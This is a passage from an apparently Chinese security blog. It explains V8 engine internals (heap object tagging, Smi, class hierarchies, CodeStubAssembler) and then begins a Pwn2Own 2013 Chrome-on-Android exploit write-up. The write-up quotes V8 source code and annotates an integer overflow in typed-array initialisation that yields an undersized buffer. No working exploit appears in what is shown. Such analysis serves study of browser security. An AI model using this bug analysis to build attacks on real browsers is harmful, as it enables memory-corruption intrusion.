1</code><br>地址以1结尾。<br>另外，v8::i::HeapObject在开头有一个v8::Map对象来表示隐藏类，以便识别它自己的类型。<br>所以v8::i::HeapObject的内存布局如下。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-09-163310.png" alt=""><br>由于我们总是有一个表示类型的v8::Map，我们可以通过查看它来看到v8::i ::HeapObject的类型。<br>此外，写为Derived Object Header的部分根据继承的对象而不同（如果它是v8::i::FixedArray则是长度字段）。<br>下面是Map和JSObject C ++代码的简化表示<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTagSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">intptr_t</span> kHeapObjectTagMask = (<span class="number">1</span> &lt;&lt; kHeapObjectTagSize) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">HasHeapObjectTag</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(value) &amp; kHeapObjectTagMask) ==</span><br><span class="line">          kHeapObjectTag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Map</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">enum</span> InstanceType &#123;</span><br><span class="line">    JS_OBJECT,</span><br><span class="line">    JS_ARRAY,</span><br><span class="line">    JS_STRING</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_instance_type</span><span class="params">(InstanceType instance_type)</span> </span>&#123;</span><br><span class="line">    instance_type_ = instance_type;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">InstanceType <span class="title">instance_type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> instance_type_;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  InstanceType instance_type_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeaderSize = <span class="keyword">sizeof</span>(Map);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> byte;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span>* Address;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeapObject</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">char</span> <span class="title">value</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>)[<span class="number">0</span>];&#125;</span><br><span class="line">  Map::<span class="function">InstanceType <span class="title">instance_type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Map*&gt;(</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>) - kHeaderSize)-&gt;instance_type();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> top = <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>) - kHeaderSize - kHeapObjectTag;</span><br><span class="line">    <span class="built_in">free</span>(top);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">protected</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> Address <span class="title">NewType</span><span class="params">(Map::InstanceType instance_type, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> allocated = <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(byte) * (size + kHeaderSize + kHeapObjectTag)));</span><br><span class="line">    <span class="keyword">auto</span> <span class="built_in">map</span> = <span class="keyword">reinterpret_cast</span>&lt;Map*&gt;(allocated);</span><br><span class="line">    <span class="built_in">map</span>-&gt;set_instance_type(instance_type);</span><br><span class="line">    <span class="keyword">return</span> allocated + kHeaderSize + kHeapObjectTag;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSObject</span>:</span> <span class="keyword">public</span> HeapObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSObject* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_OBJECT, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'o'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSObject*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSArray</span>:</span> <span class="keyword">public</span> JSObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSArray* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_ARRAY, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSArray*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSString</span>:</span> <span class="keyword">public</span> JSObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSString* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_STRING, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'s'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSString*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  JSObject* objects[] = &#123;</span><br><span class="line">    JSObject::New(),</span><br><span class="line">    JSArray::New(),</span><br><span class="line">    JSString::New()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">auto</span> o = objects[i];</span><br><span class="line">    <span class="keyword">switch</span> (o-&gt;instance_type()) &#123;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_OBJECT:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSObject =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_ARRAY:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSArray =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_STRING:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSString =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    objects[i]-&gt;Free();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>执行时，输出JSObject =&gt; o，JSArray =&gt; a，JSString =&gt; s。<br>我认为这个例子有点长，但我认为你可以看到：你可以正确地分配分配给堆的对象类型。<br>让我们解释一下Smi正在做些什么。</p><h3 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h3><p>Smi是Small Integer的缩写，可以直接在指针区域中保存最多31位的整数。<br>似乎Ruby中也采用了相同的方法。<br>对于普通指针，32位CPU使用4个字节,64位CPU使用8个字节。<br>换句话说，如果它是一个高达31位的整数，则可以存储它而不是使用指针。<br>以这种方式，通过将其固定在指针区域中而不使用堆，实现了存储器节省和加速。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smi</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> Smi* <span class="title">FromInt</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Smi*&gt;(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Smi* <span class="title">NewSmi</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Smi::FromInt(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, NewSmi(<span class="number">120</span>)-&gt;value(), NewSmi(<span class="number">110</span>)-&gt;value());</span><br><span class="line">  <span class="comment">// out 120 110</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，在v8::i::HeapObject的情况下，设置低位为1，但在Smi的情况下，结尾用0作标记，<br>通过cast可以直接进行数值计算。 因此，没有开销。<br>在64位CPU的情况下，由于指针是64位，因此可以存储更大的整数，但是为了与32位兼容，仅使用31位区域。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-09-172242.png" alt=""></p><h3 id="JSReceiver"><a href="#JSReceiver" class="headerlink" title="JSReceiver"></a>JSReceiver</h3><ul><li>JSArray</li><li>JSArrayBuffer</li><li>JSArrayBufferView<ul><li>JSTypedArray</li><li>JSDataView</li></ul></li><li>JSBoundFunction</li><li>JSCollection<ul><li>JSSet</li><li>JSMap</li></ul></li><li>JSStringIterator</li><li>JSSetIterator</li><li>JSMapIterator</li><li>JSWeakCollection<ul><li>JSWeakMap</li><li>JSWeakSet</li></ul></li><li>JSRegExp</li><li>JSFunction</li><li>JSGeneratorObject</li><li>JSGlobalObject</li><li>JSGlobalProxy</li><li>JSValue<ul><li>JSDate</li></ul></li><li>JSMessageObject</li><li>JSModuleNamespace</li><li>WasmInstanceObject</li><li>WasmMemoryObject</li><li>WasmModuleObject</li><li>WasmTableObject</li></ul><p>这些v8::i::JS~类是类的真实形式，例如v8::String和v8::Array通过API使用它们。<br>诸如v8::String之类的类只是wrapper类。<br>所有实际的实现都是v8::i::JS~类。</p><h3 id="FixedArrayBase"><a href="#FixedArrayBase" class="headerlink" title="FixedArrayBase"></a>FixedArrayBase</h3><p>v8::i::FixedArray的基本实现，它是v8中的常用类。<br>v8在里面到处都在使用这个固定长度的数组，v8::i::FixedArray有以下层次结构。</p><ul><li>DescriptorArray</li><li>FrameArray</li><li>HashTable<ul><li>Dictionary</li><li>StringTable</li><li>StringSet</li><li>CompilationCacheTable</li><li>MapCache</li></ul></li><li>OrderedHashTable<ul><li>OrderedHashSet</li><li>OrderedHashMap</li></ul></li><li>Context</li><li>FeedbackMetadata</li><li>TemplateList</li><li>TransitionArray</li><li>ScopeInfo</li><li>ModuleInfo</li><li>ScriptContextTable</li><li>WeakFixedArray</li><li>WasmSharedModuleData</li><li>WasmCompiledModule</li></ul><p>特别的，v8::i::DescriptorArray是一个存储属性描述符的数组。</p><h3 id="CodeStubAssembler-CSA"><a href="#CodeStubAssembler-CSA" class="headerlink" title="CodeStubAssembler (CSA)"></a>CodeStubAssembler (CSA)</h3><p>在v8中使用的DSL语言。<br>实际上，在v8中，编写汇编语言并不是什么新鲜事。<br>相反，通过描述可以输出汇编的CSA，可以输出具有更高<strong>可维护性</strong>的<strong>高速</strong>代码。<br>CSA的一个例子如下所示。<br>计算Fibonacci数,并将其存储在数组中.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">0</span>, temp;</span><br><span class="line">  <span class="keyword">const</span> result = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (num &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">    result.push(a);</span><br><span class="line">    temp = a;</span><br><span class="line">    a = a + b;</span><br><span class="line">    b = temp;</span><br><span class="line">    num--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将javascript函数转换为CSA时，它将成为以下代码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">TNode&lt;JSArray&gt; Fibonacci(TNode&lt;Context&gt; context) &#123;</span><br><span class="line">  TVARIABLE(var_a, MachineType::PointerRepresentation(), IntPtrConstant(<span class="number">0</span>));</span><br><span class="line">  TVARIABLE(var_b, MachineType::PointerRepresentation(), IntPtrConstant(<span class="number">1</span>));</span><br><span class="line">  TVARIABLE(var_temp, MachineType::PointerRepresentation());</span><br><span class="line">  TVARIABLE(var_index, MachineType::PointerRepresentation());</span><br><span class="line"></span><br><span class="line">  Node* fixed_array = AllocateFixedArray(PACKED_ELEMENTS, IntPtrConstant(<span class="number">11</span>),</span><br><span class="line">                           INTPTR_PARAMETERS, kAllowLargeObjectAllocation)</span><br><span class="line"></span><br><span class="line">  Label loop(<span class="keyword">this</span>), after_loop(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  Branch(IntPtrGreaterThan(IntPtrConstant(<span class="number">100</span>), var_index), &amp;loop, &amp;after_loop);</span><br><span class="line">  BIND(&amp;loop);</span><br><span class="line">  &#123;</span><br><span class="line">    StoreFixedArrayElement(fixed_array, SmiTag(var_index), var_a,</span><br><span class="line">                           SKIP_WRITE_BARRIER);</span><br><span class="line">    var_temp.Bind(var_a);</span><br><span class="line">    var_a.Bind(IntPtrAdd(var_a, var_b));</span><br><span class="line">    var_b.Bind(var_temp);</span><br><span class="line">    Increment(&amp;var_index, <span class="number">1</span>);</span><br><span class="line">    Branch(IntPtrGreaterThan(IntPtrConstant(<span class="number">100</span>), var_index),</span><br><span class="line">           &amp;loop, &amp;after_loop);</span><br><span class="line">  &#125;</span><br><span class="line">  BIND(&amp;after_loop);</span><br><span class="line">  Node* native_context = LoadNativeContext(context);</span><br><span class="line">  Node* array_map = LoadJSArrayElementsMap(PACKED_ELEMENTS, native_context);</span><br><span class="line">  Node* <span class="built_in">array</span> = AllocateUninitializedJSArrayWithoutElements(</span><br><span class="line">      array_map, SmiConstant(<span class="number">12</span>), <span class="literal">nullptr</span>);</span><br><span class="line">  StoreObjectField(<span class="built_in">array</span>, JSArray::kElementsOffset, fixed_array);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>尽管它在某种程度上是抽象的，并且有很多冗余代码，但是它不是比汇编更容易阅读吗？</p><h2 id="阅读代码"><a href="#阅读代码" class="headerlink" title="阅读代码"></a>阅读代码</h2><p>阅读v8代码非常麻烦，但有几种方法。</p><p>首先，使用每个IDE的代码跳转。<br>但是，由于v8使用了大量的宏，甚至即使是类的函数定义也可能由宏执行，因此最好在找不到时使用find | grep。</p><p>即使您阅读了代码，您可能也不知道执行时的状态，或者您可能不知道调用的层次结构，因此您应该在调试时按以下方式检查它。</p><ul><li>c++<br>由于src/base/debug/stack_trace.h中有一个StackTrace类，所以最好在要的点调用StackTrace st; st.Print()。<br>此外，由于继承v8::Object类的对象始终具有Print方法，因此可以通过调用 -&gt;Print()来查看内容。</li><li>CSA<br>由于Print()函数是在CodeStubAssembler中定义的，我们在那里传递Node *并输出执行a-&gt; Print()的代码。<br>但是，要小心，因为传递IntPtrT会失败。 在这种情况下，你可以做SmiTag。</li></ul>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>case study:Mobile PWN2OWN Autumn 2013 - Chrome on Android - Exploit Writeup</title>
      <link href="/2018/07/05/p2o_2013/"/>
      <url>/2018/07/05/p2o_2013/</url>
      <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a><br><a href="http://cygx.mydns.jp/blog/?arti=527" target="_blank" rel="noopener">http://cygx.mydns.jp/blog/?arti=527</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>从exploit的角度来看，它们都不是那么重要，但是最好从源码上了解</p><ul><li>Handle/HandleScope</li><li>Context</li><li>Isolate</li><li>Platform</li><li>Interpreter</li><li>blob</li><li>ICU</li><li>third_party</li><li>tools</li></ul><p>参考资料：<a href="https://github.com/v8/v8/wiki/Embedder&#39;s-Guide" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/Embedder&#39;s-Guide</a></p><h3 id="Handle-HandleScope"><a href="#Handle-HandleScope" class="headerlink" title="Handle/HandleScope"></a>Handle/HandleScope</h3><ul><li>Handle<ul><li>要启用GC跟踪，指针包装类型<ul><li>为了对应任何类型的指针，请使用C++模板</li><li>在源代码中，所有Object都使用此Handle<t>类型进行管理</t></li><li>GC有可能移动Object的位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-124518.png" alt=""><br>即使GC移动该Object，由于handle不移动，所以没有不一致</li></ul></li><li>常用Handle<ul><li>Handle<t><ul><li>Abstract class</li></ul></t></li><li>Local<t><ul><li>Temporary Handle, 保留在stack上</li><li><strong>使用后面将介绍的HandleScope进行生命周期管理</strong></li></ul></t></li><li>MaybeLocal<t><ul><li>它与Local<t>相同，但在使用前检查它是否为空</t></li></ul></t></li><li>Persistent<t><ul><li>一个persistent Handle,保留在heap上</li><li>代码编写器使用Persistent::Reset（）管理生命周期</li></ul></t></li></ul></li></ul></li><li>HandleScope<ul><li>handle总结<ul><li>Temporary Handle such as Local <t>, MaybeLocal<t></t></t></li><li>在声明HandleScope时，块中的每个handle都会自动关联</li></ul></li><li><strong>当HandleScope超出范围时，它会处理释放handle</strong><ul><li>返回函数时，结束{}时，等</li><li>用所有使用的handle来描述释放处理是低效的</li><li>使用HandleScope的析构函数，GC负责实际的释放处理</li></ul></li><li>参考以下的文件<ul><li>include/v8.h，src/handles.h</li></ul></li></ul></li></ul><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><ul><li>在一个V8实例中创建多个执行环境的机制<ul><li>您可以在一个线程中同时运行彼此独立的JavaScript代码</li></ul></li><li>每个Context对象都有一个全局的Root-Object</li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-132114.png" alt=""><br>左边：每个context都有一个Root-Object，并且彼此独立（在本例中，context是嵌套的，但Root-Object正确切换）<br>右边：总之，它实现了环境的切换。 我们希望分别通过window，iframe和extended script来独立保护环境。所谓的origin也是在Context中定义的，并且从一个Context到另一个Context的访问不能被默认完成。</p><h3 id="Isolate"><a href="#Isolate" class="headerlink" title="Isolate"></a>Isolate</h3><ul><li>Instance of V8 itself<ul><li>context是在同一个instance中实现不同的执行环境</li><li>当你想运行自己的多个instance时使用Isolate<ul><li>为了适应多线程</li></ul></li></ul></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-133452.png" alt=""></p><h3 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h3><ul><li>It seems to define the operating environment (it seems)<ul><li>线程相关<ul><li>决定后台线程和前台线程</li><li>管理线程池</li></ul></li><li>任务队列管理</li><li>事件追踪</li></ul></li></ul><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[src/v8/src/runtime.cc]</span><br><span class="line">RUNTIME_FUNCTION(MaybeObject*, Runtime_TypedArrayInitializeFromArrayLike)</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">size_t</span> byte_length = length * element_size;<span class="comment">//integer overflow</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (byte_length &lt; length) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;Throw(*isolate-&gt;factory()-&gt;</span><br><span class="line">      NewRangeError(<span class="string">"invalid_array_buffer_length"</span>,</span><br><span class="line">      HandleVector&lt;Object&gt;(<span class="literal">NULL</span>, <span class="number">0</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!Runtime::SetupArrayBufferAllocatingData(</span><br><span class="line">        isolate, buffer, byte_length, <span class="literal">false</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;Throw(*isolate-&gt;factory()-&gt;</span><br><span class="line">          NewRangeError(<span class="string">"invalid_array_buffer_length"</span>,</span><br><span class="line">            HandleVector&lt;Object&gt;(<span class="literal">NULL</span>, <span class="number">0</span>)));</span><br><span class="line">  &#125;<span class="comment">//The overflowed byte_length is passed to Runtime::SetupArrayBufferAllocatingData</span></span><br><span class="line">  <span class="comment">// which allocates the undersized buffer and initialises a V8 JSArrayBuffer object to point to it.</span></span><br><span class="line"></span><br><span class="line">  holder-&gt;set_buffer(*buffer);</span><br><span class="line">  holder-&gt;set_byte_offset(Smi::FromInt(<span class="number">0</span>));</span><br><span class="line">  Handle&lt;Object&gt; byte_length_obj(</span><br><span class="line">      isolate-&gt;factory()-&gt;NewNumberFromSize(byte_length));</span><br><span class="line">  holder-&gt;set_byte_length(*byte_length_obj);</span><br><span class="line">  holder-&gt;set_length(*length_obj);</span><br><span class="line">  holder-&gt;set_weak_next(buffer-&gt;weak_first_view());</span><br><span class="line">  buffer-&gt;set_weak_first_view(*holder);</span><br><span class="line"></span><br><span class="line">  Handle&lt;ExternalArray&gt; elements =</span><br><span class="line">      isolate-&gt;factory()-&gt;NewExternalArray(</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(length), array_type,</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(buffer-&gt;backing_store()));</span><br><span class="line">  holder-&gt;set_elements(*elements);</span><br><span class="line">  <span class="comment">//This JSArrayBuffer is then pointed to by a JSTypedArray for the Float64 </span></span><br><span class="line">  <span class="comment">//type which uses the original length property of the arrayLike object (which is in 8 byte units,</span></span><br><span class="line">  <span class="comment">// not bytes) to create an ExternalArray that will actually be used to manipulate the </span></span><br><span class="line">  <span class="comment">//underlying ArrayBuffer memory from javascript.</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 